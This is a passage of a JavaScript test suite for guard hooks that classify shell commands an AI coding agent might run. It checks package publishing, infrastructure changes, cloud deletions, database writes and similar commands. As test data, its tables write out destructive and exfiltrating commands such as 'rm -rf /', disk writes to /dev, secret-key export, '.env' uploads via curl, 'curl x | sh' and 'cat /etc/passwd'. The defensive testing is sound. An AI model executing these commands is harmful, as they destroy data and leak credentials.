import test from 'node:test';
import assert from 'node:assert/strict';

import { NOT_MINE, U, canMatch, judge as judgeText, judgeCommand, judgeItems, mentions, strongest } from '../scripts/lib/shared-hook/capability.mjs';
import { commandKey } from '../scripts/lib/shared-hook/shell-items.mjs';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

import { BASH_HOOKS, CASES } from './hook-capability-cases.mjs';
import { INTENT_SHAPES, validIntent, validateCapability } from './capability-contract.mjs';
import { CLI_OPTIONS } from './cli-options.mjs';
import { cleanGitEnvironment } from './git-env.mjs';

// CPU time of this process in ms: load from other processes does not inflate it, unlike wall time.
const cpuNow = () => { const { user, system } = process.cpuUsage(); return (user + system) / 1000; };

// Rules of the capability matcher (hook-design.md 1.6), on hand-built commands. Word syntax of this
// file: words split on blanks outside quotes, quotes are removed, a bare `$x` splits and `"$x"` does not,
// unquoted `*`, `?`, `[…]` are glob parts, `$"…"` is opaque, and `<P>` is an xargs placeholder.
function word(token) {
  if (token === '<P>') return { kind: 'pattern', text: token, parts: [{ any: 'expansion' }], splits: true, placeholder: 'xargs' };
  if (token.startsWith('$"')) return { kind: 'opaque', text: token };
  const parts = [];
  let splits = false;
  let quote = null;
  for (let index = 0; index < token.length; index += 1) {
    const character = token[index];
    if ((character === "'" || character === '"') && (!quote || quote === character)) { quote = quote ? null : character; continue; }
    const expansion = quote === "'" ? null : /^\$(?:\{[^}]*\}|\w+|@|\*)/.exec(token.slice(index));
    if (expansion) {
      parts.push({ any: 'expansion' });
      if (!quote || expansion[0] === '$@') splits = true;
      index += expansion[0].length - 1;
    } else if (!quote && character === '*') parts.push({ any: 'glob' });
    else if (!quote && character === '?') parts.push({ one: true });
    else if (!quote && character === '[' && token.indexOf(']', index + 2) > 0) {
      const close = token.indexOf(']', index + 2);
      const body = token.slice(index + 1, close);
      parts.push({ set: [...body.replace(/^!/, '')].map((item) => [item.codePointAt(0), item.codePointAt(0)]), negated: body.startsWith('!') });
      index = close;
    } else parts.push({ lit: character });
  }
  if (parts.every((part) => part.lit !== undefined)) return { kind: 'static', text: parts.map((part) => part.lit).join('') };
  return { kind: 'pattern', text: token, parts, ...(splits ? { splits: true } : {}) };
}
function command(text) {
  const [exe, ...words] = text.match(/(?:'[^']*'|"[^"]*"|[^\s'"])+/g).map(word);
  return { kind: 'command', key: exe.kind === 'static' ? commandKey(exe.text) : null, exe, words, wrappers: [], assignments: [], redirections: [], stdinFrom: null, operator: '', changedDirectory: false, index: 0 };
}
const judge = (text, cap) => judgeCommand(command(text), cap);

const DRY = [{ on: ['--dry-run', '--dry-run=true'], off: ['--dry-run=false', '--no-dry-run'] }];
const NPM = CLI_OPTIONS.npm;
const PACKAGE = {
  hook: 'package-publish-guard', uninspectable: 'package-publish-command-uninspectable', visible: ['npm publish', 'twine upload'],
  families: [
    { executables: ['npm', 'pnpm', 'bun'], paths: [['publish']], values: NPM.values, flags: NPM.flags, safe: DRY, rule: 'javascript-package-publish' },
    { executables: ['yarn'], paths: [['publish'], ['npm', 'publish']], values: NPM.values, rule: 'yarn-package-publish' },
    { executables: ['twine'], paths: [['upload']], rule: 'python-package-publish' },
    { executables: ['python', 'py'], paths: [['twine', 'upload']], rule: 'python-package-publish' },
    { executables: ['poetry', 'uv'], paths: [['publish']], safe: [{ on: ['--dry-run'], off: [] }], rule: 'python-package-publish' },
    { executables: ['hatch', 'flit'], paths: [['publish']], rule: 'python-package-publish' },
    { executables: ['cargo'], paths: [['publish']], safe: [{ on: ['--dry-run', '-n'], off: [] }], rule: 'native-package-publish' }
  ]
};
const INFRA = {
  hook: 'infrastructure-apply-guard', uninspectable: 'infrastructure-command-uninspectable', visible: ['terraform apply'],
  families: [
    { executables: ['terraform', 'tofu'], values: CLI_OPTIONS.terraform.values, rule: 'terraform-state-mutation',
      paths: [[['apply', 'destroy', 'import', 'force-unlock', 'taint', 'untaint']], ['state', ['rm', 'mv', 'push', 'replace-provider']], ['workspace', ['new', 'delete']]] },
    { executables: ['pulumi'], paths: [['refresh']], values: CLI_OPTIONS.pulumi.values, rule: 'pulumi-state-mutation',
      safe: [{ on: ['--preview-only', '--preview-only=true'], off: ['--preview-only=false'] }] },
    { executables: ['kubectl'], values: CLI_OPTIONS.kubectl.values, rule: 'kubernetes-state-mutation', paths: [[['apply', 'delete', 'patch']]],
      safe: [{ on: ['--dry-run=client'], off: ['--dry-run=none', '--dry-run=server', '--dry-run'] }] },
    { executables: ['helm'], paths: [[['install', 'upgrade', 'uninstall', 'rollback']]], values: CLI_OPTIONS.helm.values, rule: 'helm-release-mutation',
      safe: [{ on: ['--dry-run', '--dry-run=client', '--dry-run=true'], off: ['--dry-run=false', '--dry-run=none', '--dry-run=server'] }] }
  ]
};
const upTo = (n, verbs) => Array.from({ length: n - 1 }, (_, index) => [...Array(index + 1).fill('*'), verbs]);
const CLOUD = {
  hook: 'cloud-resource-deletion-guard', uninspectable: 'cloud-delete-command-uninspectable', visible: ['aws s3 rm'],
  families: [
    { executables: ['aws'], rule: 'aws-resource-deletion', paths: [['s3', ['rm', 'rb']], ['*', ['delete', 'delete-*', 'terminate-instances']]] },
    { executables: ['gcloud'], paths: upTo(7, ['delete', 'remove']), rule: 'gcloud-resource-deletion' }
  ]
};
const ROOTS = ['/', '/*', '~', '~/', '~/*', '/users', '/users/*'];
const operands = (view) => [...view.reading.positionals, ...view.reading.options.filter((option) => !option.word.text?.startsWith('-')).map((option) => option.word)];
const SHELL = {
  hook: 'shell-command-guard', uninspectable: 'shell-command-uninspectable',
  families: [
    { executables: ['rm'], paths: [[]], check: 'rmRules', evidence: ROOTS },
    { executables: ['dd'], paths: [[]], check: 'rawDiskWrite', evidence: ['of=/dev/*'] },
    { executables: ['gpg'], paths: [[]], decisive: ['--export-secret-keys', '--export-secret-key', '--export-secret-subkeys'], check: 'gpgExport' },
    { executables: ['git'], paths: [['push']], values: CLI_OPTIONS.git.values, check: 'pushRules' }
  ],
  checks: {
    rmRules(view) {
      const words = operands(view).concat(view.reading.options.map((option) => option.value).filter(Boolean));
      if (words.some((item) => item.kind === 'static' && ['/', '/*', '~', '~/', '~/*'].includes(item.text))) return 'broad-filesystem-delete';
      const dynamic = (item) => item.kind === 'opaque' || item.parts.some((part) => part.any === 'expansion');
      return words.some((item) => item.kind !== 'static' && (['/', '/*', '/users'].some((root) => canMatch(item, root)) || (dynamic(item) && ['~', '~/', '$home'].some((root) => canMatch(item, root))))) ? U : NOT_MINE;
    },
    rawDiskWrite(view) {
      if (view.words.some((item) => item.kind === 'static' && /^of=\/dev\/(?:r?disk|sd[a-z]|nvme)/.test(item.text))) return 'raw-disk-write';
      return view.words.some((item) => item.kind !== 'static' && canMatch(item, 'of=/dev/', 'prefix')) ? U : NOT_MINE;
    },
    gpgExport: (view) => (view.words.some((item) => item.kind === 'static' && /^--export-secret-(?:keys?|subkeys)$/.test(item.text)) ? 'credential-store-access' : NOT_MINE),
    pushRules(view) {
      if (view.words.some((item) => item.kind === 'static' && (/^--force(?:=|$)/.test(item.text) || item.text.startsWith('+')))) return 'forced-remote-history';
      return view.words.some((item) => item.kind !== 'static' && (['--force', '-f', '--delete', '-d'].some((option) => canMatch(item, option)) || canMatch(item, '+', 'prefix') || canMatch(item, ':', 'prefix'))) ? U : NOT_MINE;
    }
  }
};
const REGISTRY = {
  hook: 'container-registry-publish-guard', uninspectable: 'registry-publish-command-uninspectable',
  families: [{ executables: ['docker'], paths: [['build']], values: ['-t', '--tag', '-f', '--file', '-o', '--output'], decisive: ['--push', '--push=true', '--output', '-o'], check: 'buildPushes' }],
  checks: {
    buildPushes: (view) => (view.reading.options.some((option) => /^--push(?:=true)?$/.test(option.word.text ?? '') || (option.value?.kind === 'static' && /type=registry|push=true/.test(option.value.text))) ? 'container-build-push' : NOT_MINE)
  }
};
const SQL = /\b(?:drop|delete|truncate|update|insert|alter|create|grant|revoke)\b/i;
const DATABASE = {
  hook: 'database-query-mode-guard', uninspectable: 'database-query-uninspectable',
  families: [{ executables: ['psql', 'sqlite'], paths: [[]], evidence: [SQL], check: 'clientSql' }],
  checks: {
    clientSql(view) {
      const option = view.reading.options.find((item) => ['-c', '--command'].includes(item.word.text));
      if (!option?.value) return NOT_MINE;
      return option.value.kind !== 'static' ? U : SQL.test(option.value.text) ? 'live-database-write' : NOT_MINE;
    }
  }
};
const ARCHIVE_NAME = /\.(?:tar|tgz|zip)$/i;
const ARCHIVE = {
  hook: 'archive-extraction-guard', uninspectable: 'archive-command-uninspectable',
  families: [{ executables: ['tar'], paths: [[]], check: 'tarExtracts', evidence: [[/^-[^-]*x|^--(?:extract|get)$/, ARCHIVE_NAME]] }],
  checks: {
    tarExtracts(view) {
      if (view.words.some((item) => item.kind === 'static' && /^-[^-]*x|^--(?:extract|get)$/.test(item.text))) return 'archive-extraction-requires-review';
      return view.words.some((item) => item.kind !== 'static' && canMatch(item, '-x', 'prefix')) ? U : NOT_MINE;
    }
  }
};
const OUTBOUND = {
  hook: 'outbound-data-guard', uninspectable: 'outbound-command-uninspectable',
  families: [{ executables: ['curl'], paths: [[]], check: 'curlDecision', evidence: ['--upload-file', '-T', /^@\S/] }],
  checks: { curlDecision: (view) => (view.words.some((item) => item.kind === 'static' && ['-T', '--upload-file'].includes(item.text)) ? 'outbound-file-upload' : NOT_MINE) }
};
const CAPS = { PACKAGE, INFRA, CLOUD, SHELL, REGISTRY, DATABASE, ARCHIVE, OUTBOUND };

const ROWS = [
  // M4: safe modes are ordered, read per option role, and undone by a later possible spelling.
  ['npm publish', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --dry-run', 'PACKAGE', NOT_MINE],
  ['npm publish --dry-run=false', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --dry-run --dry-run=false', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --dry-run=false --dry-run', 'PACKAGE', NOT_MINE],
  ['npm publish --dry-run --no-dry-run', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --no-dry-run --dry-run', 'PACKAGE', NOT_MINE],
  ['npm publish --dry-run --dry-run=true', 'PACKAGE', NOT_MINE],
  ['npm publish --dry-run=true', 'PACKAGE', NOT_MINE],
  ['npm publish --dry-run "$X"', 'PACKAGE', U],
  ['npm publish --dry-run --dry-run=$X', 'PACKAGE', U],
  ['npm publish --dry-run --dry-run=f[a]lse', 'PACKAGE', U],
  ['npm publish --dry-run --tag next', 'PACKAGE', NOT_MINE],
  ['npm publish -- --dry-run', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --tag --dry-run', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish --registry=https://r --dry-run', 'PACKAGE', NOT_MINE],
  ['npm publish --no-progress --dry-run', 'PACKAGE', NOT_MINE],
  ['npm publish --unknown --dry-run', 'PACKAGE', 'javascript-package-publish'],
  ['npm publish "$X" --dry-run', 'PACKAGE', U],
  ['npm --registry r publish', 'PACKAGE', 'javascript-package-publish'],
  ['npm --no-progress test pub[l]ish', 'PACKAGE', NOT_MINE],
  ['npm --silent test src/*.test.js', 'PACKAGE', NOT_MINE],
  ['npm pub[l]ish', 'PACKAGE', U],
  ['npm -- pub[l]ish', 'PACKAGE', U],
  ['npm $CMD', 'PACKAGE', U],
  ['npm test', 'PACKAGE', NOT_MINE],
  ['cargo publish -n', 'PACKAGE', NOT_MINE],
  ['cargo publish --dry-run', 'PACKAGE', NOT_MINE],
  ['cargo publish -- -n', 'PACKAGE', 'native-package-publish'],
  ['yarn publish --dry-run', 'PACKAGE', 'yarn-package-publish'],
  ['yarn npm publish', 'PACKAGE', 'yarn-package-publish'],
  ['hatch publish --dry-run', 'PACKAGE', 'python-package-publish'],
  ['uv publish --dry-run', 'PACKAGE', NOT_MINE],
  ['python3 twine upload', 'PACKAGE', 'python-package-publish'],
  ['helm upgrade r c --dry-run', 'INFRA', NOT_MINE],
  ['helm upgrade r c --dry-run --dry-run=false', 'INFRA', 'helm-release-mutation'],
  ['helm upgrade r c --dry-run=false --dry-run', 'INFRA', NOT_MINE],
  ['helm upgrade r c --dry-run "$FLAG"', 'INFRA', U],
  ['helm upgrade r c -- --dry-run', 'INFRA', 'helm-release-mutation'],
  ['kubectl apply -f x --dry-run=client', 'INFRA', NOT_MINE],
  ['kubectl apply -f x --dry-run=client --dry-run=none', 'INFRA', 'kubernetes-state-mutation'],
  ['kubectl apply -f x -- --dry-run=client', 'INFRA', 'kubernetes-state-mutation'],
  ['kubectl apply -f x --dry-run=server', 'INFRA', 'kubernetes-state-mutation'],
  ['pulumi refresh --preview-only', 'INFRA', NOT_MINE],
  ['pulumi refresh --preview-only --preview-only=false', 'INFRA', 'pulumi-state-mutation'],
  ['terraform plan -out=tf.plan', 'INFRA', NOT_MINE],
  ['terraform -chdir x apply', 'INFRA', 'terraform-state-mutation'],
  ['terraform state r[m] x', 'INFRA', U],
  ['terraform state list', 'INFRA', NOT_MINE],
  // M1: pattern and opaque executables; M1b evidence for executables without a literal character.
  ['$CMD pub[l]ish', 'PACKAGE', U],
  ['$CMD publish', 'PACKAGE', U],
  ['$CMD pub*', 'PACKAGE', U],
  ['${NPM:-npm} publish', 'PACKAGE', U],
  ['"$HOME/bin/npm" publish', 'PACKAGE', U],
  ['"$HOME/bin/npm" test', 'PACKAGE', NOT_MINE],
  ['n[p]m publish', 'PACKAGE', U],
  ['n[p]m test', 'PACKAGE', NOT_MINE],
  ['$"np"m test', 'PACKAGE', NOT_MINE],
  ['$"np" publish', 'PACKAGE', U],
  ['$CMD $ARGS', 'PACKAGE', NOT_MINE],
  ['"$EDITOR" src/*.js', 'PACKAGE', NOT_MINE],
  ['$CMD *', 'PACKAGE', NOT_MINE],
  ['$PYTHON -m pytest', 'PACKAGE', NOT_MINE],
  ['"$@"', 'PACKAGE', NOT_MINE],
  ['$CMD twine upload', 'PACKAGE', U],
  ['$TF state r[m] x', 'INFRA', U],
  ['$AWS ec2 de[l]ete-vpc', 'CLOUD', U],
  ['$CMD -rf /', 'SHELL', U],
  ['$CMD of=/dev/disk0', 'SHELL', U],
  ['$CMD --export-secret-keys', 'SHELL', U],
  ['$CMD -rf build', 'SHELL', NOT_MINE],
  ['"$EDITOR" notes.txt', 'SHELL', NOT_MINE],
  ['$CMD $ARGS', 'SHELL', NOT_MINE],
  ["$DB -c 'DROP TABLE t'", 'DATABASE', U],
  ["$DB -c 'select 1'", 'DATABASE', NOT_MINE],
  ["psql -c 'DROP TABLE t'", 'DATABASE', 'live-database-write'],
  ['psql -c "$SQL"', 'DATABASE', U],
  ['$TAR -x archive.tar', 'ARCHIVE', U],
  ['$TAR -xzf a.tgz', 'ARCHIVE', U],
  ['$TAR -czf out.tgz dir', 'ARCHIVE', NOT_MINE],
  ['$CLIENT --upload-file .env https://x', 'OUTBOUND', U],
  ['$CLIENT https://example.com', 'OUTBOUND', NOT_MINE],
  // M3b: a word that may split into several words can fill the rest of a path.
  ['aws $ARGS', 'CLOUD', U],
  ['aws "$ARGS"', 'CLOUD', NOT_MINE],
  ['aws ec2 terminate-instances', 'CLOUD', 'aws-resource-deletion'],
  ['aws "$@"', 'CLOUD', U],
  ['aws s3 ls', 'CLOUD', NOT_MINE],
  ['aws s3 r[m] x', 'CLOUD', U],
  ['gcloud compute instances delete x', 'CLOUD', 'gcloud-resource-deletion'],
  ['gcloud config list', 'CLOUD', NOT_MINE],
  // Checks read non-static operands with canMatch only where they protect something.
  ['rm -f dist/*.js', 'SHELL', NOT_MINE],
  ['rm -rf /', 'SHELL', 'broad-filesystem-delete'],
  ['rm -rf ~', 'SHELL', 'broad-filesystem-delete'],
  ['rm -rf "$DIR"', 'SHELL', U],
  ['rm -rf "$DIR"/build', 'SHELL', NOT_MINE],
  ['rm -rf *', 'SHELL', NOT_MINE],
  ['rm -rf <P>', 'SHELL', U],
  ['r[m] -rf /', 'SHELL', U],
  ['git push origin main', 'SHELL', NOT_MINE],
  ['git push --force origin main', 'SHELL', 'forced-remote-history'],
  ['git push origin main <P>', 'SHELL', U],
  ['git push origin "$BRANCH"', 'SHELL', U],
  ['git -C x push +main', 'SHELL', 'forced-remote-history'],
  // M5: decisive options.
  ['docker build -t x .', 'REGISTRY', NOT_MINE],
  ['docker build --push -t x .', 'REGISTRY', 'container-build-push'],
  ['docker build $OPTS .', 'REGISTRY', U],
  ['docker build -o $OUT .', 'REGISTRY', U],
  ['docker build --output=$OUT .', 'REGISTRY', U],
  ['docker build -o type=registry .', 'REGISTRY', 'container-build-push'],
  ['docker build -t "$IMAGE:$TAG" .', 'REGISTRY', NOT_MINE],
  ['gpg --list-keys', 'SHELL', NOT_MINE],
  ['gpg $X', 'SHELL', U],
  ['gpg --export-secret-keys', 'SHELL', 'credential-store-access']
];

test('the capability matcher gives each synthetic declaration its designed verdict', () => {
  const failures = [];
  for (const [text, cap, expected] of ROWS) {
    const actual = judge(text, CAPS[cap]);
    if (actual !== expected) failures.push(`${cap} ${text}: expected ${expected}, got ${actual}`);
  }
  assert.deepEqual(failures, []);
});

// T1: the behavior table. Every row is judged by its hook's payload, which exports CAPABILITY.
const HOOK_FILES = hookFiles();
const PAYLOADS = await hookPayloads();
function hookFiles() {
  const found = new Map();
  const walk = (directory) => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const next = path.join(directory, entry.name);
      if (entry.isDirectory()) walk(next);
      else if (entry.name.endsWith('.mjs') && next.includes(`${path.sep}targets${path.sep}claude-code${path.sep}`)) found.set(entry.name.slice(0, -4), next);
    }
  };
  walk(path.resolve('artifacts', 'hooks'));
  return found;
}
async function hookPayloads() {
  const payloads = new Map();
  for (const hook of BASH_HOOKS) {
    const file = HOOK_FILES.get(hook);
    const module = file && readFileSync(file, 'utf8').includes('export const CAPABILITY') ? await import(pathToFileURL(file)) : null;
    if (module) payloads.set(hook, module);
  }
  return payloads;
}
// Hooks that read the repository run as their main does, in a clean one with one commit on a
// feature branch, where signing is configured, so a plain commit passes. sensitive-file-access-guard
// reads the file system of the working directory (collectRuntimeContext).
let t1Repository = null;
function verdictOf(row) {
  const payload = PAYLOADS.get(row.hook);
  if (payload) {
    const input = { tool_name: 'Bash', tool_input: { command: row.command }, cwd: process.cwd() };
    if (payload.collectContext || row.hook === 'commit-guard') {
      t1Repository ??= repository((directory, git) => { git('config', 'commit.gpgSign', 'true'); git('switch', '-q', '-c', 'work'); });
      input.cwd = t1Repository;
    }
    const collect = payload.collectContext ?? payload.collectRuntimeContext;
    const result = collect ? payload.evaluate(input, collect(input)) : payload.evaluate(input);
    if (result.exitCode === 0) return 'allow';
    return result.ruleId === payload.CAPABILITY.uninspectable ? 'U' : result.ruleId;
  }
  return null;
}
const meets = (row, actual) => (row.expected === 'block' ? actual !== 'allow' : actual === row.expected);

test('T1: every critique, prototype, and everyday case has its designed verdict', (context) => {
  const project = process.env.CLAUDE_PROJECT_DIR;
  delete process.env.CLAUDE_PROJECT_DIR;
  context.after(() => {
    if (project !== undefined) process.env.CLAUDE_PROJECT_DIR = project;
    if (t1Repository) rmSync(t1Repository, { recursive: true, force: true });
  });
  const failures = [];
  for (const row of CASES) {
    const actual = verdictOf(row);
    if (actual === null) failures.push(`[${row.group}] ${row.hook}: no payload declares CAPABILITY`);
    else if (!meets(row, actual)) failures.push(`[${row.group}] ${row.hook}: expected ${row.expected}, got ${actual}: ${JSON.stringify(row.command.slice(0, 120))}`);
  }
  assert.deepEqual(failures, []);
});

test('command keys, canMatch modes, precedence, and visible phrases', () => {
  assert.deepEqual(['python3.12', '/usr/bin/GIT', 'mkfs.ext4', 'gpg2', 'C:\\Tools\\NPM.EXE', '7z', 'ip6tables-nft'].map(commandKey), ['python', 'git', 'mkfs', 'gpg', 'npm', '7z', 'ip6tables-nft']);
  const glob = word('dist/*.js');
  assert.equal(canMatch(glob, 'dist/a.js'), true);
  assert.equal(canMatch(glob, 'dist/a/b.js'), false, 'a glob part never produces /');
  assert.equal(canMatch(word('"$D"/x'), 'a/b/x'), true, 'an expansion produces anything');
  assert.equal(canMatch(word('--o*'), '--output=', 'prefix'), true);
  assert.equal(canMatch(word('*.timer'), '.timer', 'suffix'), true);
  assert.equal(canMatch(word('*.service'), '.timer', 'suffix'), false);
  assert.equal(canMatch(word('[!a]x'), 'ax'), false);
  assert.equal(canMatch(word('[!a]x'), 'bx'), true);
  assert.equal(canMatch(word('$"x"'), 'anything'), true);
  assert.equal(strongest(NOT_MINE, U, 'rule', U), 'rule');
  assert.equal(strongest(NOT_MINE, U), U);
  const cap = { visible: ['npm publish', '/etc/', '.env'] };
  assert.equal(mentions(cap, 'x; NPM Publish'), true);
  assert.equal(mentions(cap, 'npm publishing'), false);
  assert.equal(mentions(cap, 'cat /etc/passwd'), true);
  assert.equal(mentions(cap, 'cat .env'), true);
});

test('items decide in order; limits are uninspectable; unseen programs belong to their owner', () => {
  const owner = { ...SHELL, unseen: 'unseenProgram', checks: { ...SHELL.checks, unseenProgram: (item) => (item.source === 'network' ? 'internet-to-shell' : item.allowlisted ? NOT_MINE : U) } };
  const items = (...list) => list;
  const unseen = (source, allowlisted, text = 'x') => ({ kind: 'unseen', source, producer: null, allowlisted, text });
  assert.equal(judgeItems(items(command('npm test'), command('npm publish')), PACKAGE), 'javascript-package-publish');
  assert.equal(judgeItems(items(command('npm pub[l]ish'), command('npm publish')), PACKAGE), U, 'the first decisive item decides');
  assert.equal(judgeItems(items(command('npm publish'), { kind: 'limit', reason: 'depth' }), PACKAGE), 'javascript-package-publish');
  assert.equal(judgeItems(items(command('npm test'), { kind: 'limit', reason: 'depth' }), PACKAGE), U);
  assert.equal(judgeItems(items(unseen('network', false)), owner), 'internet-to-shell');
  assert.equal(judgeItems(items(unseen('output', true)), owner), NOT_MINE);
  assert.equal(judgeItems(items(unseen('variable', false)), owner), U);
  assert.equal(judgeItems(items(unseen('network', false, 'curl x | sh')), PACKAGE), NOT_MINE);
  assert.equal(judgeItems(items(unseen('variable', false, 'S="npm publish"; bash -c "$S"')), PACKAGE), U);
  // A dynamic executable in a call that defines functions is U when a body concerns the hook.
  const withBodies = (bodies, ...list) => Object.assign(list, { functions: new Map(bodies) });
  assert.equal(judgeItems(withBodies([['f', [command('npm publish')]]], command('$name')), PACKAGE), U);
  assert.equal(judgeItems(withBodies([['f', [command('echo hi')]]], command('$name')), PACKAGE), NOT_MINE);
  assert.equal(judgeItems(withBodies([['f', [command('npm publish')]]], command('"$HOME/x" y')), PACKAGE), NOT_MINE);
});

// Runners (hook-design 1.4): a hook with `runners: true` also judges the command a package runner starts.
test('runners reach the command a package runner starts, only for hooks that declare them', () => {
  const RESET = { hook: 'r', uninspectable: 'r-u', runners: true, families: [{ executables: ['prisma'], paths: [['migrate', 'reset']], rule: 'reset' }], checks: {} };
  for (const text of ['npx prisma migrate reset', 'npx --yes prisma migrate reset', 'npx -p prisma prisma migrate reset', 'bunx prisma migrate reset',
    'pnpm exec prisma migrate reset', 'pnpm dlx prisma migrate reset', 'pnpm prisma migrate reset', 'yarn dlx prisma migrate reset', 'yarn prisma migrate reset',
    'bun x prisma migrate reset', 'bun run prisma migrate reset', 'npm exec -- prisma migrate reset', 'npm x prisma migrate reset', 'bundle exec prisma migrate reset',
    'uv run prisma migrate reset', 'poetry run prisma migrate reset', 'npx npx prisma migrate reset']) assert.equal(judge(text, RESET), 'reset', text);
  assert.equal(judge('npx prisma migrate status', RESET), NOT_MINE);
  assert.equal(judge('npm prisma migrate reset', RESET), NOT_MINE, 'npm runs a binary only with exec');
  assert.equal(judge('npx $TOOL migrate reset', RESET), U, 'a dynamic tool can be the family executable');
  assert.equal(judge('npx prisma migrate reset', { ...RESET, runners: undefined }), NOT_MINE);
});

test('T7: declarations follow the schema, the evidence rule, and the CLI option fixture', () => {
  for (const cap of [PACKAGE, INFRA, CLOUD, SHELL, REGISTRY, DATABASE, ARCHIVE, OUTBOUND]) {
    const problems = validateCapability(cap, { ...CLI_OPTIONS, docker: { values: ['-t', '--tag', '-f', '--file', '-o', '--output'] } });
    assert.deepEqual(problems, [], cap.hook);
  }
  // Every payload that declares its capability.
  for (const [hook, payload] of PAYLOADS) assert.deepEqual(validateCapability(payload.CAPABILITY, CLI_OPTIONS), [], hook);
  const errors = (cap) => validateCapability({ hook: 'h', uninspectable: 'h-u', checks: { c: () => NOT_MINE }, ...cap }).join('\n');
  assert.match(errors({ families: [{ executables: ['rm'], paths: [[]], check: 'c' }] }), /must declare evidence/);
  assert.match(errors({ families: [{ executables: ['rm'], paths: [[]], check: 'c', evidence: [] }] }), /needs evidenceNone/);
  assert.equal(errors({ families: [{ executables: ['rm'], paths: [[]], check: 'c', evidence: [], evidenceNone: 'operands are names' }] }), '');
  assert.equal(errors({ families: [{ executables: ['gpg'], paths: [['*']], check: 'c', decisive: ['--x'] }] }), '');
  assert.match(errors({ families: [{ executables: ['npm'], paths: [['publish']], values: ['--bogus'], rule: 'r' }] }), /values --bogus of npm is not in the CLI option fixture/);
  assert.match(errors({ families: [{ executables: ['npm'], paths: [['publish']], safe: [{ on: ['--simulate'], off: [] }], rule: 'r' }] }), /safe --simulate/);
  assert.match(errors({ families: [{ executables: ['npm'], paths: [['publish']], check: 'missing' }] }), /check missing does not exist/);
  assert.match(errors({ families: [{ executables: ['npm'], paths: [['publish']], rule: 'r', check: 'c' }] }), /exactly one of rule and check/);
  assert.match(errors({ families: [{ executables: ['sqlite3'], paths: [[]], rule: 'r' }] }), /not a command key \(sqlite\)/);
  assert.match(errors({ families: [{ executables: ['x'], paths: [[{}]], rule: 'r' }] }), /bad step/);
  assert.match(errors({ families: [], commands: 'nope' }), /commands check nope does not exist/);
  assert.match(errors({ families: [], extra: 1 }), /unknown key extra/);
});

// T7 inventory (hook-design 5): exactly the 31 Bash hooks export CAPABILITY, and no payload uses a
// name of the old shell analysis outside its shared blocks.
const OLD_API = /\b(?:parseShellCommands|gitInvocation|executableName|analyzeCommitContent|inlineScriptCommands|policyVocabulary|globVariants|globWord|SHELL_MAX_COMMAND_BYTES|SHELL_NAMES|SHELL_WRAPPERS)\b/;
test('T7: exactly the 31 Bash hooks declare a capability, and no payload uses the old shell API', () => {
  assert.equal(BASH_HOOKS.length, 31);
  assert.deepEqual([...PAYLOADS.keys()].sort(), [...BASH_HOOKS].sort());
  const declaring = [...HOOK_FILES].filter(([, file]) => readFileSync(file, 'utf8').includes('export const CAPABILITY')).map(([hook]) => hook);
  assert.deepEqual(declaring.sort(), [...BASH_HOOKS].sort());
  for (const [hook, file] of HOOK_FILES) {
    const outside = readFileSync(file, 'utf8').replace(/^\/\/ <youdede:shared [a-z0-9-]+>$[\s\S]*?^\/\/ <\/youdede:shared>$/gm, '');
    assert.equal(OLD_API.exec(outside)?.[0], undefined, hook);
  }
});

test('T7: intent records have the declared shapes', () => {
  assert.equal(validIntent('CommitIntent', { found: true, uninspectable: false, unsupported: null, scopeChanged: false, worktree: true, noVerify: false }), true);
  assert.equal(validIntent('CommitIntent', { found: true, uninspectable: false, unsupported: 'other', scopeChanged: false, worktree: true, noVerify: false }), false);
  assert.equal(validIntent('SigningIntent', { states: ['explicit', 'default'], scoped: false }), true);
  assert.equal(validIntent('SigningIntent', { states: ['maybe'], scoped: false }), false);
  assert.equal(validIntent('CommitPlan', { kind: 'staged', untracked: true }), true);
  assert.equal(validIntent('CommitPlan', { kind: 'staged' }), false);
  assert.equal(validIntent('ReleasePlan', { intent: 'release', manager: 'npm', directories: ['pkg'] }), true);
  assert.equal(validIntent('ReleasePlan', { intent: 'release', manager: 'maven', directories: [] }), false);
  assert.deepEqual(Object.keys(INTENT_SHAPES), ['CommitIntent', 'SigningIntent', 'CommitPlan', 'ReleasePlan']);
});

// T3: doubling the words at most triples the time, for the worst reading shapes: unknown options read
// both ways, and non-static words that may take a value. Only the matcher is timed, not building the
// command; the two sizes run alternately and the fastest run of each counts, so load from test files
// running in parallel falls on both. A unit is measured up to three times, as in the parser's T3:
// quadratic work gives a ratio of 4 on every attempt.
test('T3: the matcher is linear in the words', () => {
  const time = (view) => {
    const started = cpuNow();
    judgeCommand(view, PACKAGE); judgeCommand(view, SHELL); judgeCommand(view, INFRA);
    return cpuNow() - started;
  };
  // `$X` without a space is one word of many expansion parts.
  for (const unit of ['-a x ', '$X ', '--dry-run $X ', 'x ', '$X']) {
    const [small, large] = [8000, 16000].map((count) => command(`npm publish ${unit.repeat(count)}`.trim()));
    time(small);
    let message = '';
    for (let attempt = 0; attempt < 3; attempt += 1) {
      let [fastSmall, fastLarge] = [Infinity, Infinity];
      for (let run = 0; run < 7; run += 1) {
        fastSmall = Math.min(fastSmall, time(small));
        fastLarge = Math.min(fastLarge, time(large));
      }
      message = fastLarge <= Math.max(fastSmall * 3, 5) ? '' : `${JSON.stringify(unit)}: ${fastSmall.toFixed(1)} ms then ${fastLarge.toFixed(1)} ms`;
      if (!message) break;
    }
    assert.equal(message, '');
  }
});

// T4: each migrated payload, spawned as a process, blocks its first family's protected command with
// the concrete rule and passes the `case` control.
const MIGRATED = {
  'shell-command-guard': ['artifacts/hooks/security/application-security/shell-command-guard/targets/claude-code/shell-command-guard.mjs', 'rm -rf /', 'broad-filesystem-delete'],
  'package-publish-guard': ['artifacts/hooks/operations/package-publication/package-publish-guard/targets/claude-code/package-publish-guard.mjs', 'npm publish', 'javascript-package-publish'],
  'infrastructure-apply-guard': ['artifacts/hooks/operations/infrastructure-execution/infrastructure-apply-guard/targets/claude-code/infrastructure-apply-guard.mjs', 'terraform apply', 'terraform-state-mutation'],
